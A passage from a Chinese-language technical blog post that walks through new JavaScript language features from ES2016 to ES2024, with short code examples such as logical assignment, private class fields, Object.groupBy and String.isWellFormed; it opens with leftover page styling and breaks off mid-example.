gyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ES6 是 2015 年发布的。<br/>
距离现在，已经过去整整十年。</p>
<p>这十年里，JavaScript 每一年都在进化。<br/>
新语法、新 API、新并发模型、新数据结构……</p>
<p>可大多数人，对 JavaScript 的认知，仍停留在：</p>
<ul>
<li>箭头函数</li>
<li>解构赋值</li>
<li>Promise</li>
<li>let / const</li>
</ul>
<p>从 ES2016 到 ES2025，你真的跟上了吗？</p>
<p>这篇文章，我会按时间线带你系统梳理 JavaScript 十年的演进轨迹。</p>
<hr/>
<h2 data-id="heading-0">ES2016 → ES2020</h2>
<p>这5年新出的特性我想大多数人都已经熟练使用了，这里就简单列下，不详细介绍api细节了</p>
<h3 data-id="heading-1">ES2016</h3>
<p>这是一个小版本,主要有以下3个特性：</p>
<ul>
<li><strong><code>Array.prototype.includes()</code></strong></li>
<li><strong>指数运算符 (<code>**</code>)</strong>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">2</span> ** <span class="hljs-number">3</span>; <span class="hljs-comment">// 8</span>
</code></pre>
</li>
<li><strong>幂赋值运算符<code>**=</code></strong>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> num = <span class="hljs-number">2</span>; 
num **= <span class="hljs-number">3</span>; <span class="hljs-comment">// num = num ** 3 </span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 8</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-2">ES2017</h3>
<p>ES2017的重点是异步编程，对象操作</p>
<ul>
<li><strong>async/await</strong></li>
<li><strong>Object.values()/Object.entries()</strong></li>
<li><strong>Object.getOwnPropertyDescriptors()</strong>: 返回对象所有自身属性的描述符对象</li>
<li><strong>字符串填充String Padding</strong></li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5'</span>.<span class="hljs-title function_">padStart</span>(<span class="hljs-number">3</span>, <span class="hljs-string">'0'</span>)); <span class="hljs-comment">// '005' </span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello'</span>.<span class="hljs-title function_">padEnd</span>(<span class="hljs-number">10</span>, <span class="hljs-string">'*'</span>)); <span class="hljs-comment">// 'hello*****'</span>
</code></pre>
<ul>
<li>
<p><strong>SharedArrayBuffer 和 Atomics</strong></p>
<p>这两个用在web worker中。主线程和worker使用postMessage通信往往要将数据拷贝一份，SharedArrayBuffer 则允许 Worker 线程与主线程共享同一块内存，通过 <code>postMessage</code> 将 <code>SharedArrayBuffer</code> 转移给 Worker，不会复制数据：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main.js</span>
 <span class="hljs-keyword">const</span> sab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedArrayBuffer</span>(<span class="hljs-number">1024</span>);
 <span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">'worker.js'</span>);
 worker.<span class="hljs-title function_">postMessage</span>(sab); <span class="hljs-comment">//不复制数据</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// worker.js</span>
 self.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
   <span class="hljs-keyword">const</span> sab = e.<span class="hljs-property">data</span>; <span class="hljs-comment">// 同一个内存块</span>
 };
</code></pre>
</li>
</ul>
<p>计算机中写操作可能被编译成多条指令，如果尚未写完就有其他线程读数据，便会产生错误。在多线程操作SharedArrayBuffer时就可能会出现这种问题。Atomics提供了原子级操作，其他线程读取到的数据，要么是没写入的，要么是已写完的。另外Atomics还提供了线程的阻塞和唤醒。</p>
<h3 data-id="heading-3">ES2018</h3>
<p>ES2018新增了多个特性，算是一次中等规模升级，主要有异步编程的增强、对象和数组操作的改进、正则表达式的扩展，以及模板字面量的优化。</p>
<ul>
<li><strong>异步生成器/异步迭代器</strong></li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>* <span class="hljs-title function_">fetchPages</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> page = <span class="hljs-number">1</span>;
  <span class="hljs-keyword">while</span> (page &lt;= <span class="hljs-number">3</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/page/<span class="hljs-subst">${page}</span>`</span>);
    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
    page++;
  }
}

(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> data <span class="hljs-keyword">of</span> <span class="hljs-title function_">fetchPages</span>()) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
  }
})();
</code></pre>
<ul>
<li><strong><code>Promise.prototype.finally()</code></strong></li>
<li><strong>rest/spreat操作符<code>...</code></strong></li>
<li><strong>正则表达式增强（后行断言，命名捕获等）</strong></li>
<li><strong>模板字符串的标签模板提供raw访问原始字符串</strong></li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">tag</span>(<span class="hljs-params">strings</span>) { 
    <span class="hljs-keyword">return</span> strings.<span class="hljs-property">raw</span>[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 访问原始字符串，包括非法转义，比如LaTeX语法</span>
} 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tag<span class="hljs-string">`\u{00000042}`</span>); <span class="hljs-comment">// strings[0]是'B' strings.raw[0]为\u{00000042}</span>
</code></pre>
<h3 data-id="heading-4">ES2019</h3>
<p>该版本内容不多但很实用</p>
<ul>
<li><strong>Array.prototype.flat() / flatMap()</strong></li>
<li><strong><code>Object.fromEntries()</code></strong></li>
<li><strong>String.trimStart() / trimEnd()</strong></li>
<li><strong>Optional catch binding</strong>: <code>catch</code> 可省略错误参数</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">try</span> {
  <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'invalid json'</span>);
} <span class="hljs-keyword">catch</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parsing failed'</span>); <span class="hljs-comment">// 无需未使用的 error 变量</span>
}
</code></pre>
<ul>
<li><strong>Symbol.description</strong></li>
<li><strong>Function.prototype.toString()能返回函数精确源码，包括注释和空格，方便调试</strong></li>
<li><strong>稳定的 Array.prototype.sort()</strong></li>
</ul>
<h3 data-id="heading-5">ES2020</h3>
<p>这个版本也是一个里程碑，更新了大量内容，而且都很实用</p>
<ul>
<li><strong>BigInt</strong></li>
<li><strong>Dynamic Import <code>import()</code></strong></li>
<li><strong>空值合并运算符<code>??</code></strong></li>
<li><strong>可选链运算符<code>?.</code></strong></li>
<li><strong>Promise.allSettled()</strong></li>
<li><strong>String.prototype.matchAll()</strong></li>
<li><strong>标准全局对象globalThis</strong></li>
<li><strong>模块命名空间导出（export * as ns from 'mod'）</strong></li>
<li><strong>for-in 枚举顺序与定义顺序一致</strong></li>
</ul>
<hr/>
<p>从ES2021开始新增的特性，在我日常code review中看到的越来越少了，但很多特性还是很实用的。</p>
<h2 data-id="heading-6">ES2021</h2>
<h3 data-id="heading-7">String.prototype.replaceAll()</h3>
<p>在此之前全局替换需要用正则/g标志</p>
<h3 data-id="heading-8">逻辑赋值运算符 (<code>&amp;&amp;=</code>, <code>||=</code>, <code>??=</code>)</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>;
x ||= <span class="hljs-number">10</span>; <span class="hljs-comment">// x = 10（因为 0 是 falsy）</span>

<span class="hljs-keyword">let</span> y = <span class="hljs-number">5</span>;
y &amp;&amp;= <span class="hljs-number">20</span>; <span class="hljs-comment">// y = 20（因为 5 是 truthy）</span>

<span class="hljs-keyword">let</span> z;
z ??= <span class="hljs-string">'default'</span>; <span class="hljs-comment">// z = 'default'（因为 undefined 是 nullish）</span>
</code></pre>
<h3 data-id="heading-9">数字分隔符(<code>1_000_000</code>)</h3>
<p>允许在数字字面量中使用下划线（_）作为分隔符，提高大数字的可读性。</p>
<h3 data-id="heading-10">Promise.any()</h3>
<p>返回一个 Promise，在任意一个输入 Promise resolved 时解决；如果所有 rejected，则返回 AggregateError。</p>
<ul>
<li>
<p><strong>语法</strong>：Promise.any(iterable)</p>
<ul>
<li>iterable：Promise 数组或其他可迭代对象。</li>
</ul>
</li>
<li>
<p><strong>示例</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promises = [
  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'Error 1'</span>),
  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'Success'</span>),
  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-string">'Error 2'</span>)
];
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">any</span>(promises)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value)) <span class="hljs-comment">// 'Success'（第一个 resolved）</span>
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error)); <span class="hljs-comment">// 如果全 reject：AggregateError</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-11">WeakRefs和FinalizersRegistry:</h3>
<ul>
<li>WeakRefs 用于引用对象而不阻止垃圾回收</li>
<li>FinalizersRegistry 用于缓存或观察对象，而不干扰内存管理；FinalizationRegistry 提供清理回调，但不保证时序。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> obj = { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span> };
<span class="hljs-keyword">const</span> weak = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakRef</span>(obj);

<span class="hljs-keyword">const</span> registry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FinalizationRegistry</span>(<span class="hljs-function"><span class="hljs-params">heldValue</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Object with <span class="hljs-subst">${heldValue}</span> cleaned up`</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weak.<span class="hljs-title function_">deref</span>());<span class="hljs-comment">//undefined</span>
});
registry.<span class="hljs-title function_">register</span>(obj, <span class="hljs-string">'Alice'</span>);
obj = <span class="hljs-literal">null</span>; <span class="hljs-comment">// GC 时调用 callback</span>
</code></pre>
<hr/>
<h2 data-id="heading-12">ES2022</h2>
<h3 data-id="heading-13">Top-level await：</h3>
<p>可以直接在模块最外层使用 <code>await</code></p>
<h3 data-id="heading-14">Class的私有/静态成员和方法</h3>
<p>增加了<code>#</code>标识私有，<code>static</code>标识静态（现在都用ts了，这两个特性很少用到）</p>
<pre><code class="hljs language-js" lang="js"> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
  #value = <span class="hljs-number">0</span>;

  #<span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.#value++;
  }

  get #<span class="hljs-title function_">count</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#value;
  }

  <span class="hljs-title function_">add</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.#<span class="hljs-title function_">increment</span>();
  }

  <span class="hljs-title function_">getValue</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#count;
  }
}

<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
c.<span class="hljs-title function_">add</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c.<span class="hljs-title function_">getValue</span>()); <span class="hljs-comment">// 1</span>
<span class="hljs-comment">// c.#increment(); // SyntaxError,不过控制台访问不会报错</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtils</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;
  <span class="hljs-keyword">static</span> #secret = <span class="hljs-number">42</span>;

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getPi</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">PI</span>;
  }

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getSecret</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#secret;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-property">PI</span>); <span class="hljs-comment">// 3.14159</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-title function_">getSecret</span>()); <span class="hljs-comment">// 42</span>
</code></pre>
<h3 data-id="heading-15">Error.cause:</h3>
<p>在 Error 对象中添加 cause 属性，用于链式记录错误上下文，方便调试。</p>
<pre><code class="hljs language-js" lang="js"> <span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Original issue'</span>);
} <span class="hljs-keyword">catch</span> (err) {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Failed operation'</span>, { <span class="hljs-attr">cause</span>: err });
}
<span class="hljs-comment">// 结果错误：Failed operation (cause: Original issue)</span>
</code></pre>
<h3 data-id="heading-16">at方法:</h3>
<p>新增访问索引方法，可用于数组、字符串和 TypedArray</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">at</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">at</span>(-<span class="hljs-number">1</span>)); <span class="hljs-comment">// 3（最后一个元素，极力推荐这种写法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello'</span>.<span class="hljs-title function_">at</span>(-<span class="hljs-number">2</span>)); <span class="hljs-comment">// 'l'</span>
</code></pre>
<h3 data-id="heading-17">Object.hasOwn()：</h3>
<p>代替Object.prototype.hasOwnProperty.call()</p>
<h3 data-id="heading-18">正则表达式的/d标志：</h3>
<p>可用/d标志获取匹配范围</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-keyword">const</span> match = <span class="hljs-string">'hello world'</span>.<span class="hljs-title function_">matchAll</span>(<span class="hljs-regexp">/(hello)/</span>dg);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> m <span class="hljs-keyword">of</span> match) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(m.<span class="hljs-property">indices</span>[<span class="hljs-number">0</span>]); <span class="hljs-comment">// [0, 5] 对于 'hello'</span>
    }
</code></pre>
<hr/>
<h2 data-id="heading-19">ES2023</h2>
<h3 data-id="heading-20">Array 和 TypedArray的末尾查找</h3>
<p>新增findLast() / findLastIndex()</p>
<h3 data-id="heading-21">通过拷贝修改数组(不改变原数组)</h3>
<p>新增 toSorted() / toReversed() / toSpliced() / with()</p>
<ul>
<li>
<p><strong>语法</strong>：</p>
<ul>
<li>array.toReversed()：返回反转拷贝。</li>
<li>array.toSorted(compareFn)：返回排序拷贝。</li>
<li>array.toSpliced(start, deleteCount, ...items)：返回拼接拷贝。</li>
<li>array.with(index, value)：返回替换指定索引值的拷贝。</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">toSorted</span>()); <span class="hljs-comment">// [1, 2, 3]（原 arr 不变）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">toReversed</span>()); <span class="hljs-comment">// [2, 3, 1]</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">toSpliced</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>)); <span class="hljs-comment">// [1, 4, 2]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">with</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)); <span class="hljs-comment">// [5, 3, 2]</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-22">Hashbang 语法</h3>
<p>允许在 ECMAScript 文件开头使用 #!（shebang）注释，指示解释器执行脚本。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-meta">#!/usr/bin/env node</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello from Node.js'</span>);
</code></pre>
<h3 data-id="heading-23">允许 <strong>Symbols</strong> 用作 WeakMap、WeakSet 的键</h3>
<p>此前key仅支持对象</p>
<hr/>
<h2 data-id="heading-24">ES2024</h2>
<h3 data-id="heading-25">Promise.withResolvers()</h3>
<p>同时创建 Promise 及其 resolve 和 reject 函数，便于手动控制 Promise 的状态。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { promise, resolve, reject } = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">withResolvers</span>();

<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">'Success'</span>), <span class="hljs-number">1000</span>);

promise.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value)); <span class="hljs-comment">// 'Success'</span>
</code></pre>
<h3 data-id="heading-26">Object.groupBy() 和 Map.groupBy()</h3>
<p>静态方法，用于根据回调函数返回的值对可迭代对象进行分组，返回一个对象（Object.groupBy）或 Map（Map.groupBy）。</p>
<ul>
<li>
<p><strong>语法</strong>：</p>
<ul>
<li>Object.groupBy(iterable, callback)</li>
<li>Map.groupBy(iterable, callback)</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> items = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'apple'</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">'fruit'</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'carrot'</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">'vegetable'</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'banana'</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">'fruit'</span> }
];

<span class="hljs-keyword">const</span> grouped = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">groupBy</span>(items, <span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">type</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(grouped); <span class="hljs-comment">// { fruit: [{...}, {...}], vegetable: [{...}] }</span>

<span class="hljs-keyword">const</span> groupedMap = <span class="hljs-title class_">Map</span>.<span class="hljs-title function_">groupBy</span>(items, <span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">type</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(groupedMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">'fruit'</span>)); <span class="hljs-comment">// [{...}, {...}]</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-27">正则表达式/v标志</h3>
<p>新标志 /v 启用 Unicode 集模式，支持属性的组合、范围、否定、交集 / 并集运算</p>
<p>在 <code>/v</code> 标志出现前，JS 正则有 <code>/u</code> 标志支持<strong>基础 Unicode 属性转义</strong>（如 <code>\p{Letter}</code> 匹配字母），但只能匹配 “单一属性”，无法直接表达 “属性的组合 / 范围 / 否定”，而 <code>/v</code> 标志正是为了解决这个问题，提供<strong>扩展 Unicode 属性转义</strong>能力。</p>
<ul>
<li>
<p><strong>语法</strong>：/pattern/v</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/[\p{Emoji}&amp;&amp;\p{Emoji_Presentation}]/</span>v;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(regex.<span class="hljs-title function_">test</span>(<span class="hljs-string">'😀'</span>)); <span class="hljs-comment">// true（Emoji）</span>

<span class="hljs-comment">// 集操作示例</span>
<span class="hljs-keyword">const</span> setDiff = <span class="hljs-regexp">/[a-z--[aeiou]]/</span>v; <span class="hljs-comment">// 辅音</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(setDiff.<span class="hljs-title function_">test</span>(<span class="hljs-string">'b'</span>)); <span class="hljs-comment">// true</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-28">Atomics.waitAsync()</h3>
<p>共享内存的异步等待方法，返回一个 Promise，在共享值变化时解决。</p>
<ul>
<li>
<p><strong>语法</strong>：Atomics.waitAsync(array, index, value, timeout)</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> sab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedArrayBuffer</span>(<span class="hljs-number">16</span>);
<span class="hljs-keyword">const</span> int32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Int32Array</span>(sab);

<span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Atomics</span>.<span class="hljs-title function_">waitAsync</span>(int32, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
result.<span class="hljs-property">value</span>.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Woken up'</span>));
<span class="hljs-comment">// 其他线程：Atomics.store(int32, 0, 1); Atomics.notify(int32, 0);</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-29">ArrayBuffer 和 SharedArrayBuffer 的resize和transfer</h3>
<ul>
<li>
<p><strong>语法</strong>：</p>
<ul>
<li>buffer.resize(newLength)</li>
<li>buffer.transfer(newLength)：返回新缓冲区，旧的被分离。</li>
<li>类似方法可用于 SharedArrayBuffer。</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>, { <span class="hljs-attr">maxByteLength</span>: <span class="hljs-number">16</span> });
buffer.<span class="hljs-title function_">resize</span>(<span class="hljs-number">16</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(buffer.<span class="hljs-property">byteLength</span>); <span class="hljs-comment">// 16</span>

<span class="hljs-keyword">const</span> transferred = buffer.<span class="hljs-title function_">transfer</span>();
<span class="hljs-comment">// 原 buffer 被分离，无法使用</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-30">String.prototype.isWellFormed() 和 toWellFormed()</h3>
<p>这两个api用于"<strong>格式不良</strong>"字符串.</p>
<p>JavaScript 字符串基于 UTF-16 编码，其中<strong>单独的代理对字符（未配对的高 / 低代理项）</strong> 属于 “格式不良” 的字符串（也叫 “畸形 UTF-16 字符串”）。</p>
<p>高代理项范围：<code>0xD800</code> - <code>0xDBFF</code></p>
<p>低代理项范围：<code>0xDC00</code> - <code>0xDFFF</code>只有高 + 低代理项配对才是合法的 UTF-16 字符，单独出现其中一个就是 “格式不良”。</p>
<pre><code class="hljs language-js" lang="js">   <span class="hljs-comment">// 1. 格式良好的字符串（正常字符、合法代理对）</span>
   <span class="hljs-keyword">const</span> validStr1 = <span class="hljs-string">'Hello 世界'</span>;
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(validStr1.<span class="hljs-title function_">isWellFormed</span>()); <span class="hljs-comment">// true</span>

   <span class="hljs-keyword">const</span> validStr2 = <span class="hljs-string">'\uD83D\uDE00'</span>; <span class="hljs-comment">// 😀（合法的高+低代理对）</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(validStr2.<span class="hljs-title function_">isWellFormed</span>()); <span class="hljs-comment">// true</span>

   <span class="hljs-comment">// 2. 格式不良的字符串（单独的高代理项/低代理项）</span>
   <span class="hljs-keyword">const</span> invalidStr1 = <span class="hljs-string">'\uD83D'</span>; <span class="hljs-comment">// 单独的高代理项（无对应低代理项）</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(invalidStr1.<span class="hljs-title function_">isWellFormed</span>()); <span class="hljs-comment">// false</span>

   <span class="hljs-keyword">const</span> invalidStr2 = <span class="hljs-string">'测试\uDC00'</span>; <span class="hljs-comment">// 单独的低代理项（无对应高代理项）</span>
